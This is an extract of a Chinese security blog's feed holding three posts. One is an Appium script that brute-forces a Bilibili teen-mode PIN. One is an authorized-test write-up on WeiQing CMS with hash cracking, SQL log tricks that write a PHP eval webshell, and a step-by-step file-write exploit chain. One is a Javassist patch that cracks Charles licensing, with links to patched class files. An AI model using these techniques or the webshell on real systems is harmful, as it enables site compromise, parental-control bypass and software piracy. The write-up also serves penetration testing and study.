class="line">driver.find_element_by_xpath(<span class="string">"//XCUIElementTypeButton[@name=\"下一步\"]"</span>).click()</span><br></pre></td></tr></table></figure><p>执行结果如图所示。</p><p><img src="15.gif" alt="运行效果"></p><blockquote><p>这里的动图是4倍速播放。</p></blockquote><p>修改过后，发现速度确实有所提升，但是总体速度还是很慢的。经过搜索发现，有帖子说在IOS模拟器上和安卓上会快一些，由于程序无法安装到IOS模拟器，所以这里选择了在安卓设备上进行测试。</p><h3 id="安卓环境下测试"><a href="#安卓环境下测试" class="headerlink" title="安卓环境下测试"></a>安卓环境下测试</h3><p>安卓的环境需要安装Android SDK、JDK、安卓模拟器(真机也可以，这里采用的是Genymotion模拟器)。安装后配置<code>JAVA_HOME</code>、<code>ANDROID_HOME</code>。</p><p>然后通过执行<code>appium-doctor --android</code>来查看是否配置成功，如图所示。</p><p><img src="15.png" alt="运行效果"></p><p>查看android元素信息可以使用<code>uiautomatorviewer</code>。位于Android SDK下的<code>/tools/bin/</code>目录。</p><p>启动模拟器并打开测试的APP，然后打开<code>uiautomatorviewer</code>。选择<code>Device Screenshot</code>（从左至右第二个图标）。</p><p><img src="16.png" alt="运行效果"></p><p>通过<code>tv.danmaku.bili:id/et_code</code>可以定位到编辑框，按钮“立即验证”可以通过<code>tv.danmaku.bili:id/operate</code>来定位。</p><p>这里直接贴使用安卓下自动化爆破的脚本，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> appium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    desired_caps = dict()</span><br><span class="line">    desired_caps[<span class="string">'platformName'</span>] = <span class="string">'Android'</span></span><br><span class="line">    desired_caps[<span class="string">'platformVersion'</span>] = <span class="string">'6.0'</span></span><br><span class="line">    desired_caps[<span class="string">'deviceName'</span>] = <span class="string">'Nexus'</span></span><br><span class="line">    desired_caps[<span class="string">'appPackage'</span>] = <span class="string">'tv.danmaku.bili'</span></span><br><span class="line">    desired_caps[<span class="string">'appActivity'</span>] = <span class="string">'ui.splash.SplashActivity'</span></span><br><span class="line">    desired_caps[<span class="string">'noReset'</span>] = <span class="literal">True</span></span><br><span class="line">    desired_caps[<span class="string">'automationName'</span>] = <span class="string">'UiAutomator2'</span></span><br><span class="line"></span><br><span class="line">    driver = webdriver.Remote(<span class="string">'http://localhost:4723/wd/hub'</span>, desired_caps)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> pwd <span class="keyword">in</span> range(<span class="number">4011</span>,<span class="number">10000</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            driver.find_element_by_id(<span class="string">'tv.danmaku.bili:id/et_code'</span>).send_keys(pwd)</span><br><span class="line">            driver.find_element_by_id(<span class="string">"tv.danmaku.bili:id/operate"</span>).click()</span><br><span class="line">            print(pwd,<span class="string">'error'</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            print(pwd,<span class="string">'is right'</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    time.sleep(<span class="number">4</span>)</span><br><span class="line">    driver.quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>运行效果如图所示</p><p><img src="17.gif" alt="运行效果"></p><p>对比之下，在Android下的效率是很快的。而且经过测试，安卓破解100次，耗时约<code>139.14s</code>，而ios破解50次，耗时约<code>262.56s</code>。</p><p>所以最后我采用了安卓环境下进行破解，最终成功跑出了密码。</p><p><img src="18.gif" alt="运行效果"></p><p>已经成功找到密码4578。</p><h2 id="0x03-思考"><a href="#0x03-思考" class="headerlink" title="0x03 思考"></a>0x03 思考</h2><p>由于输入密码的时候并没有发生网络请求，猜测密码应该保存在本地。一般情况下本地存储采用sqlite数据库或者是SharePreferences中。</p><p>先查看SharePreferences中的文件，进入<code>/data/data/tv.danmaku.bili/shared_prefs</code>目录。</p><p><img src="17.png" alt="shared_prefs目录"></p><p>发现文件<code>bili_teenagers_mode_preferences20449166.xml</code>，根据文件名发现文件就是和青少年模式有关的配置文件。查看里面的内容</p><p><img src="18.png" alt="teenagers_mode文件"></p><p>发现一串神秘字符串，通过cmd5查询：c2890d44d06bafb6c7b4aa194857ccbc=md5(4578)。正好是设置的密码。</p><p>另外由于登录前可以看到所有的内容，而登录开启青少年模式的账户时，就会进入青少年模式，只能看特定内容。所以退出账户重新登录并抓包，可以看到如下的请求。</p><p><img src="19.png" alt="抓包"></p><p>也成功找到经过md5加密的密码。</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>这次是因为B站开启了青少年模式，后来密码给忘记了。当时只想着用爆破的方式来解决了，没有想着抓包或者查看保存的数据文件。后来爆破出密码后，又发现可以通过查看配置文件的方式和抓包的方式找到密码。而且之前是打算用ios作为测试的，后来因为效率的问题，才转战安卓。如果使用安卓的话，自动化测试工具也很多，例如UIAutomator2等。</p><p>本文其实就是一个流水账，记录一下自己找回青少年模式密码的过程，可能比较粗糙。有关IOS真机调试更详细的教程可以参考<a href="https://www.jianshu.com/p/ae8846736dba" target="_blank" rel="noopener">使用Appium进行iOS的真机自动化测试</a> 。</p>]]></content>
      
      
      <categories>
          
          <category> 自动化测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Appium </tag>
            
            <tag> 自动化测试 </tag>
            
            <tag> 青少年模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次从源代码泄漏到后台获取webshell的过程</title>
      <link href="/2020/04/18/WeiQing-CMS-Background-Admin-GetShell/"/>
      <url>/2020/04/18/WeiQing-CMS-Background-Admin-GetShell/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>在一次授权测试中对某网站进行测试时，marry大佬发现了一个网站的备份文件，里面有网站源代码和数据库备份等。根据网站信息和代码都可以发现该系统采用的是微擎cms，利用数据库备份中的用户信息解密后可以登录系统，接下来要看是否可以获取webshell。</p><a id="more"></a><h2 id="0x02-WEBSHELL获取的尝试"><a href="#0x02-WEBSHELL获取的尝试" class="headerlink" title="0x02 WEBSHELL获取的尝试"></a>0x02 WEBSHELL获取的尝试</h2><p>有了数据库备份文件，然后找一下是否有用户的信息，能否登录系统。</p><h3 id="1-登录后台"><a href="#1-登录后台" class="headerlink" title="1.登录后台"></a>1.登录后台</h3><p>解压备份文件可以从<code>data/backup</code>目录下找到数据库的备份，从中找到了用户表<code>ims_users</code>。</p><p><img src="01.png" alt="01"></p><p>知道了用户名、加密后的密码和salt，我们去看一下密码加密的算法。</p><p>我这里直接搜索<code>password</code>，在forget.ctrl.php中找到了一处。</p><p><img src="02.png" alt="02"></p><p>密码加密方法是<code>$password = md5($password . $member_info[&#39;salt&#39;] . $_W[&#39;config&#39;][&#39;setting&#39;][&#39;authkey&#39;]);</code>。是根据<code>原密码+salt+authkey</code>的形式进行拼接，然后进行md5加密。</p><p>authkey在<code>data/config.php</code>文件中。</p><p><img src="03.png" alt="03"></p><p>现在salt和authkey以及加密后的密码已经获得，开始去解密密码是多少。这里我们将<code>salt</code>和<code>authkey</code>拼接为新的<code>salt</code>，然后使用<code>md5($pass.$salt)</code>的加密方式进行解密。</p><p><img src="04.png" alt="04"></p><p>解密后即可登录后台。</p><p><img src="05.png" alt="05"></p><p>接下来就是webshell的获取了。</p><p>本以为都已经是管理员了，获取shell就是分分钟的事，然而事情远远没有那么简单。</p><h3 id="2-失败的获取shell过程"><a href="#2-失败的获取shell过程" class="headerlink" title="2.失败的获取shell过程"></a>2.失败的获取shell过程</h3><p>根据搜索发现，该cms后台获取shell的方法也不少，主要还是围绕执行sql这里。但我这里都失败了，就简单的提一下。</p><p><strong>第一种方法：</strong></p><p>站点管理-附件设置-图片附件设置-支持文件后缀，任意添加一个类型，例如添加<code>pppppp</code>。</p><p>然后执行sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> ims_core_settings <span class="keyword">SET</span> <span class="keyword">value</span> = <span class="keyword">replace</span>(<span class="keyword">value</span>, <span class="string">'pppppp'</span>, <span class="string">'php '</span>)</span><br></pre></td></tr></table></figure><p>更新缓存，之后就可以上传<code>&quot;*.php &quot;</code>文件了。但是有限制，适用于apache下，而且版本有限制。目标站不使用该方法的原因有二，一是该系统上传的位置是腾讯云COS上，二是server是Tengine。</p><p><strong>第二种方法：</strong></p><p>第二种方法也是和sql执行有关，利用日志文件写shell。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%general%'</span>;  <span class="comment">#查看配置</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log = <span class="keyword">on</span>;  <span class="comment">#开启general log模式</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file = <span class="string">'/var/www/html/1.php'</span>;   <span class="comment">#设置日志目录为shell地址</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php eval($_POST[cmd]);?&gt;'</span>  <span class="comment">#写入shell</span></span><br></pre></td></tr></table></figure><p>或者通过慢查询（slow_query_log）的方法写shell。但目标系统也是失败，执行sql的时候报错。</p><p>还有一些其他的方法，这里测试也是失败的，就不再列举了。</p><h2 id="0x03-代码审计"><a href="#0x03-代码审计" class="headerlink" title="0x03 代码审计"></a>0x03 代码审计</h2><p>病急乱投医，熬成老中医。既然之前的方法不管用，只好去翻代码吧，找找是否有新的利用方式。翻出之前的一个文档，从里面找到之前的审计过程，看能否对现在有用。结果打开发现只有一个数据包和还有一句未实现的结论。</p><p><img src="06.png" alt="06"></p><p>没办法，只好重新围着这个点继续审计，看是否能有所进展。</p><h3 id="1-分析"><a href="#1-分析" class="headerlink" title="1.分析"></a>1.分析</h3><p>打开文件<code>web/source/cloud/dock.ctrl.php</code>，找到执行的<code>download</code>方法。</p><p><img src="07.png" alt="07"></p><p>代码比较简单，我大概说一下这里的流程：</p><p>如果请求包非Base64加密的格式，那么<code>$data</code>就是请求包的内容。然后对<code>$data</code>进行发序列化返回<code>$ret</code>，接下来获取<code>$ret[&#39;file&#39;]</code>并Base64解密返回<code>$file</code>。当存在<code>gzcompress</code>和<code>gzuncompress</code>这两个函数时，就会利用<code>gzuncompress</code>函数对<code>$file</code>进行解压操作。</p><p>将获取的<code>$file</code>进行md5加密后，与<code>$ret[&#39;path&#39;]</code>以及获取的<code>$_W[&#39;setting&#39;][&#39;site&#39;][&#39;token&#39;]</code>进行拼接为<code>$string</code>。当满足<code>$_W[&#39;setting&#39;][&#39;site&#39;][&#39;token&#39;]</code>非空并且<code>$string</code>md5加密后的结果与<code>$ret[&#39;sign&#39;]</code>一致时，才可以进行下面的操作。下面就是文件的写入了，根据<code>$ret[&#39;path&#39;]</code>进行判断，然后写入的位置不一样。</p><p>这里关键的一点就是<code>$_W[&#39;setting&#39;][&#39;site&#39;][&#39;token&#39;]</code>这个值的获取。这个是利用authcode函数对<code>cache_load(cache_system_key(&#39;cloud_transtoken&#39;))</code>进行解密获取的。</p><p><code>authcode</code>函数位于<code>framework/function/global.func.php</code>文件中。</p><p><img src="08.png" alt="08"></p><p>由上面代码可以看出，要想使用<code>authcode</code>加解密，需要知道<code>$GLOBALS[&#39;_W&#39;][&#39;config&#39;][&#39;setting&#39;][&#39;authkey&#39;]</code>，在上面提到过，authkey在<code>data/config.php</code>文件中。</p><p>那么如果想任意写文件，就需要知道<code>cache_system_key(&#39;cloud_transtoken&#39;)</code>的内容了。</p><h3 id="2-cloud-transtoken的获取"><a href="#2-cloud-transtoken的获取" class="headerlink" title="2.cloud_transtoken的获取"></a>2.cloud_transtoken的获取</h3><p>通过搜索发现，这个值是在文件<code>framework/model/cloud.mod.php</code>中的<code>cloud_build_transtoken</code>函数中被写入的，通过进入<code>cache_write</code>方法，发现会写入数据库中。</p><p><img src="09.png" alt="09"></p><p>既然会写入到数据库中，而且目标系统下载到时候有数据库的备份文件，我们直接在数据库备份文件中搜索<code>cloud_transtoken</code>。结果并没有找到，可能原因是没有写入<code>cloud_transtoken</code>的时候就进行了数据库备份。</p><p>我们往上回溯，看哪里调用了<code>cloud_build_transtoken</code>。</p><p>发现了其中的一条利用链：</p><p><img src="10.png" alt="10"></p><p>当访问<a href="http://ip:port/web/index.php?c=cloud&amp;a=profile">http://ip:port/web/index.php?c=cloud&amp;a=profile</a> 时，就会判断站点ID和通信密钥是否为空（即站点是否注册），如果站点注册了，就会调用<code>cloud_site_info()</code>函数获取站点信息。函数<code>cloud_site_info()</code>调用了<code>cloud_api(&#39;site/info&#39;)</code>，这里的method为<code>site/info</code>，所以继续调用<code>cloud_build_transtoken</code>从会而将<code>cloud_transtoken</code>的内容写入数据库。然后通过数据库备份的功能，就可以看到数据库中保存的<code>cloud_transtoken</code>，进而可以利用之前的分析写shell。</p><h3 id="3-自定义数据库备份"><a href="#3-自定义数据库备份" class="headerlink" title="3.自定义数据库备份"></a>3.自定义数据库备份</h3><p>由于数据库备份需要关闭站点，为了不影响目标站点的使用，这里我们搭建一个环境演示一下过程（需要注册站点）。</p><p>登录成功后更新缓存，然后访问<a href="http://ip:port/web/index.php?c=cloud&amp;a=profile">http://ip:port/web/index.php?c=cloud&amp;a=profile</a> ，关闭站点后进行数据库备份。</p><p><img src="11.png" alt="11"></p><p>发现可以获取<code>cloud_transtoken</code>，但是数据库目录和文件的名字是随机的。</p><p><img src="12.png" alt="12"></p><p>而且如果备份文件里面的数据库文件不是最新的，那么即使获取到<code>cloud_transtoken</code>也无法利用，我们需要最新的备份文件。</p><p>然后我们看一下数据库备份是怎么实现的，打开<code>web/source/system/database.ctrl.php</code>。</p><p><img src="13.png" alt="13"></p><p>发现文件夹和分卷名可以自定义，如果为空或不满足条件的话，文件夹是时间戳、下划线和8位随机字符串的拼接，分卷名是<code>volume-10位随机字符串-1.sql</code>的形式，既然可以自定义，那么就简单多了。</p><p>访问链接<a href="http://ip:port/web/index.php?c=system&amp;a=database&amp;do=backup&amp;status=1&amp;start=2&amp;folder_suffix=123&amp;volume_suffix=456">http://ip:port/web/index.php?c=system&amp;a=database&amp;do=backup&amp;status=1&amp;start=2&amp;folder_suffix=123&amp;volume_suffix=456</a> 进行数据库备份，则数据库备份文件的地址为：<a href="http://ip:port/data/backup/123/volume-456-1.sql">http://ip:port/data/backup/123/volume-456-1.sql</a></p><p><img src="14.png" alt="14"></p><p>然后就可以随时获取<code>cloud_transtoken</code>了。接下来就可以进行shell的获取了。</p><h3 id="4-获取WEBSHELL"><a href="#4-获取WEBSHELL" class="headerlink" title="4.获取WEBSHELL"></a>4.获取WEBSHELL</h3><p>根据上面的分析，<code>cloud_transtoken</code>、<code>authkey</code>已经知道了，接下来就是构造payload了。</p><p><img src="15.png" alt="15"></p><p>然后请求<a href="http://ip:port/web/index.php?c=cloud&amp;a=dock&amp;do=download">http://ip:port/web/index.php?c=cloud&amp;a=dock&amp;do=download</a> ，data为生成的payload。</p><p><img src="16.png" alt="16"></p><p><img src="17.png" alt="17"></p><p>可以进行任意文件的写入，对目标系统进行测试，也成功获取了shell。</p><h3 id="5-延伸"><a href="#5-延伸" class="headerlink" title="5.延伸"></a>5.延伸</h3><p>上面是因为有系统文件备份，然后获取<code>/data/config.php</code>中的<code>authkey</code>。如果没有文件备份，登录了一个管理员权限的用户，能否获取shell呢。答案也是可以的。</p><p>该系统有一个木马查杀功能，可以根据这个功能读取文件内容。</p><p><img src="18.png" alt="18"></p><p>选择一个目录，然后提交并拦截数据库包，修改查杀目录为<code>data/.</code>，特征函数为<code>password</code>。然后就可以看到查杀结果，获取<code>authkey</code>的值。</p><p><img src="19.png" alt="19"></p><p>在对最新版 v2.5.7（202002140001）进行木马查杀的时候，可以从查杀报告中看到该文件，但是查看时提示文件不存在。原因是最新版利用正则对文件路径进行匹配，如果匹配成功就提示文件不存在（windows下可以利用大写路径绕过）。</p><p><img src="20.png" alt="20"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>根据上面对分析过程，该漏洞的利用过程如下：</p><p>1.成功登录后台，且拥有管理员权限。</p><p>2.更新缓存（非必须），访问链接<a href="http://ip:port/web/index.php?c=cloud&amp;a=profile">http://ip:port/web/index.php?c=cloud&amp;a=profile</a> 写入<code>cloud_transtoken</code>到数据库中。</p><p>3.关闭站点并进行使用自定义的目录进行数据库备份，链接地址：<a href="http://ip:port/web/index.php?c=system&amp;a=database&amp;do=backup&amp;status=1&amp;start=2&amp;folder_suffix=123&amp;volume_suffix=456">http://ip:port/web/index.php?c=system&amp;a=database&amp;do=backup&amp;status=1&amp;start=2&amp;folder_suffix=123&amp;volume_suffix=456</a> 。然后下载数据库备份，地址为：<a href="http://ip:port/data/backup/123/volume-456-1.sql">http://ip:port/data/backup/123/volume-456-1.sql</a> （多个分卷的话文件名为volume-456-2.sql、volume-456-3.sql… ）,然后找到<code>cloud_transtoken</code>。 </p><p>4.生成payload，请求<a href="http://ip:port/web/index.php?c=cloud&amp;a=dock&amp;do=download">http://ip:port/web/index.php?c=cloud&amp;a=dock&amp;do=download</a> ，写入shell。</p><p>总的来说，利用上述方法获取shell需要满足两个条件，第一是拥有一个管理员权限的用户，第二就是该站点注册了云服务。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 微擎 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Charles的一次破解之旅</title>
      <link href="/2019/10/25/charles-crack/"/>
      <url>/2019/10/25/charles-crack/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>本文以WEB抓包工具Charles(v4.2.8)为例，讲解一下其注册的流程以及如何使用<strong>javassist</strong>对java软件进行修改，达到破解的目的。</p><a id="more"></a><p>先看一下实现的效果。使用<code>任意用户名+任意key</code>就可以进行激活。</p><p><img src="01.png" alt="注册"></p><p>激活成功</p><p><img src="02.png" alt="注册成功"></p><p>如果想换用户名，取消注册再次注册即可。</p><p>Help-&gt;Unregister Charles…</p><p><img src="03.png" alt></p><p>接下来我们来分析一下注册的流程，以及如何去破解。</p><h3 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h3><p>首先打开软件(版本为v4.2.8)，未注册时需要等待10s的动画才可进入，而且30分钟后会退出软件。</p><p>打开Help-&gt;Register Charles…，看到注册界面。</p><p><img src="04.png" alt></p><p>使用<code>jadx-gui</code>打开charles.jar，搜索字符串<code>Register Charles</code>，定位到<code>com.xk72.charles.gui.frames.RegisterFrame</code>中。</p><p><img src="05.png" alt></p><p><img src="06.png" alt></p><p>其中一段代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.bRegister.addActionListener(<span class="keyword">new</span> NBdE(<span class="keyword">this</span>));</span><br></pre></td></tr></table></figure><p>可以看到注册按钮绑定的事件，当按下注册按钮时，执行<code>new NBdE(this)</code>。</p><p>跟进到<code>com.xk72.charles.gui.frames.NBdE</code></p><p><img src="07.png" alt></p><blockquote><p>其中的trim为Registered Name，trim2为License Key</p></blockquote><p>首先对输入的name和key进行判断，需要其长度要大于0，然后调用<code>qHTb.DdNM(trim, trim2)</code>方法，并对其返回的结果进行判断。当不为null时，注册失败。反之则注册成功。</p><p>跟进<code>com.xk72.charles.qHTb</code>中，调用的是<code>DdNM(String str1,String str2)</code></p><p><img src="08.png" alt></p><blockquote><p>由之前的推断可以知道，当<code>qHTb.DdNM(str1, str2)=null</code>时注册成功，这里DdNM(String str1,String str2)函数中如果正常执行<code>twLa = new qHTb(str, str2);</code>则会返回null，否则返回异常的信息。所以需要看<code>twLa = new qHTb(str, str2);</code>是否抛出异常，如果未异常，则返回为<code>null</code>，即注册成功；反之，注册失败。</p></blockquote><p>继续跟进构造函数<code>qHTb(String str1,String str2)</code>。</p><p><img src="09.png" alt></p><p>构造函数<code>qHTb(String str1,String str2)</code>调用了<code>qHTb(String str1,String str2,int i)</code></p><p>其主要代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">qHTb</span><span class="params">(String str, String str2, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">boolean</span> z = <span class="keyword">false</span>;</span><br><span class="line">     <span class="keyword">this</span>.gbef = <span class="keyword">false</span>;<span class="comment">//表示是否注册成功 true为成功</span></span><br><span class="line">     <span class="keyword">this</span>.lPpR = <span class="string">"Unregistered"</span>;<span class="comment">//注册成功后为输入的Registered Name</span></span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         String replaceAll = str.replaceAll(<span class="string">"[  ᠎    　]"</span>, <span class="string">" "</span>);<span class="comment">//替换特殊字符</span></span><br><span class="line">         <span class="keyword">if</span> (DdNM(twLa(replaceAll, str2, <span class="number">4</span>))) &#123;</span><br><span class="line">             z = <span class="keyword">true</span>;</span><br><span class="line">         &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!replaceAll.equals(str)) &#123;</span><br><span class="line">             z = DdNM(twLa(str, str2, <span class="number">4</span>));</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">if</span> (!z) &#123;</span><br><span class="line">             <span class="keyword">throw</span> <span class="keyword">new</span> LicenseException(DdNM(<span class="number">2</span>));</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">this</span>.lPpR = str;<span class="comment">//注册成功，lPpR为Registered Name</span></span><br><span class="line">         <span class="keyword">this</span>.gbef = <span class="keyword">true</span>;<span class="comment">//注册成功</span></span><br><span class="line">     &#125; <span class="keyword">catch</span> (NumberFormatException e) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> LicenseException(DdNM(<span class="number">1</span>));</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>因此要使注册成功，首先需要<code>twLa(String str,String str2, int i)</code>在调用的时候无异常，并且需要<code>DdNM(long j)</code>返回为true。</p><p><img src="10.png" alt></p><p>由以上代码可知，当<code>j=lGuB</code>时，返回为true。<code>lGuB</code>为已知常量。即需要满足<code>j=5911726755176091652L;</code>时，<code>DdNM(long j)</code>返回为true。</p><p>接下来看<code>twLa(String str,String str2, int i)</code>。</p><p><img src="11.png" alt></p><blockquote><p>由于jadx-gui查看twLa未反编译完全，为了查看方便，这里用Idea打开。</p></blockquote><p><img src="12.png" alt></p><p>twLa方法的三个参数，var1是注册的name，var2是注册的key，var3是4.</p><p><img src="13.png" alt></p><p>分割线以上的为注册码的校验，下面为对用户名进行操作。可以从以上的代码看出，在用户名操作时没有抛出异常的行为，所以从这里来看，注册成功与否与用户名没有直接关系（因为从之前的推断可知，当出现异常时注册失败）。</p><p>所以这里的破解思路是：</p><p>使用<strong>javassist</strong>修改<code>twLa(String str,String str2, int i)</code>中的第二个参数，为一个可用的注册码，然后使该函数的返回值为<code>5911726755176091652L</code>即可。</p><p>当然也可以直接修改<code>DdNM(long j)</code>返回为true，修改DdNM<code>(String str1, String str2)</code>第二个参数为可用的key。这样修改以后，在软件运行注册的时候，可以达到任意用户名和任意key注册的效果。</p><blockquote><p>当然修改的方法不止这两种，知道注册流程后，修改就很容易了。</p></blockquote><p>接下来引入如何使用<strong>javassist</strong>来对软件进行修改。</p><h3 id="0x03-使用javassist进行修改"><a href="#0x03-使用javassist进行修改" class="headerlink" title="0x03 使用javassist进行修改"></a>0x03 使用javassist进行修改</h3><p>Javassist是一个开源的分析、编辑和创建Java字节码的类库。虽然关于java字节码的处理有很多工具，如bcel，asm。不过这些都需要直接跟虚拟机指令打交道。而且Javassit 提供了更高级的API，无需掌握字节码指令的知识，对使用者要求较低。直接使用java编码的形式，不需要了解虚拟机指令，就能动态改变类的结构，或者动态生成类。</p><h4 id="v4-2-8的修改"><a href="#v4-2-8的修改" class="headerlink" title="v4.2.8的修改"></a>v4.2.8的修改</h4><p>根据上面的分析，修改v4.2.8时，需要修改<code>DdNM(long j)</code>返回为true，修改DdNM<code>(String str1, String str2)</code>第二个参数为可用的key，例如<code>C9D1226DB5B93C12D1</code>。</p><p>利用Javassist进行修改起来也很简单，具体实现代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ClassPool pool = ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">      pool.insertClassPath(<span class="string">"~/Desktop/charles.jar"</span>);</span><br><span class="line">      CtClass ctClass = pool.get(<span class="string">"com.xk72.charles.qHTb"</span>);</span><br><span class="line">      CtMethod ctm1 = ctClass.getDeclaredMethod(<span class="string">"DdNM"</span>,<span class="keyword">new</span> CtClass[]&#123;pool.get(<span class="string">"long"</span>)&#125;);</span><br><span class="line">      ctm1.setBody(<span class="string">"return true;"</span>);<span class="comment">//修改返回值</span></span><br><span class="line">      </span><br><span class="line">      CtMethod ctm2 = ctClass.getDeclaredMethod(<span class="string">"DdNM"</span>,<span class="keyword">new</span> CtClass[]&#123;pool.get(<span class="string">"java.lang.String"</span>),pool.get(<span class="string">"java.lang.String"</span>)&#125;);</span><br><span class="line">      ctm2.insertBefore(<span class="string">"$2=\"C9D1226DB5B93C12D1\";"</span>);<span class="comment">//修改第二个参数</span></span><br><span class="line"></span><br><span class="line">      ctClass.writeFile(<span class="string">"~/Desktop/"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>然后更新修改的内容，并替换</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jar -uvf charles.jar com</span><br><span class="line"></span><br><span class="line">cp charles.jar /Applications/Charles.app/Contents/Java/</span><br></pre></td></tr></table></figure><p>然后再次打开Charles注册时就可以达到文章开头的效果了。</p><p>更改后的文件：<a href="https://fuping.site/files/qHTb.class">https://fuping.site/files/qHTb.class</a></p><blockquote><p>使用方法：新建文件夹com/xk72/charles，然后将class文件放入其中，执行<code>jar -uvf charles.jar com</code>。再替换charles.jar即可。</p></blockquote><h4 id="v4-5-4的修改"><a href="#v4-5-4的修改" class="headerlink" title="v4.5.4的修改"></a>v4.5.4的修改</h4><p>当时修改的时候最新版是v4.2.8，10.29号下载的是v4.5.1，还没来得及安装，再次查看最新版已经是v4.5.4了。</p><p>虽然更新了，其中类名和方法名改变了，但是注册的流程还是老样子。根据上面的思路可以进行修改。找到注册校验的类。</p><p><img src="14.png" alt></p><p>需要修改的类为<code>com.xk72.charles.DIWy</code>。</p><p>需要修改的方法：</p><p>1.<code>private boolean OZtq(long var1)</code>，返回值修改为true。</p><p>2.<code>public static String OZtq(String var0, String var1)</code>，第二个参数为可用的key。</p><p>修改的代码就不贴了，和上面的一样，修改一下类名和方法名即可。</p><p>打开Charles后任意用户名+任意注册码注册成功。</p><p><img src="15.png" alt></p><p>更改后的文件：<a href="https://fuping.site/files/DIWy.class">https://fuping.site/files/DIWy.class</a></p><h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>关于Charles破解的文章，网上有很多。大多数都是直接修改了注册的标志和注册的信息，本文也是提供了另外一种破解的思路。通过简单分析注册的流程，然后使用javassist进行java文件的修改，以此达到破解的目的。</p><p>关于更多Charles破解相关的文章，可以参考以下几篇：</p><p>[1].<a 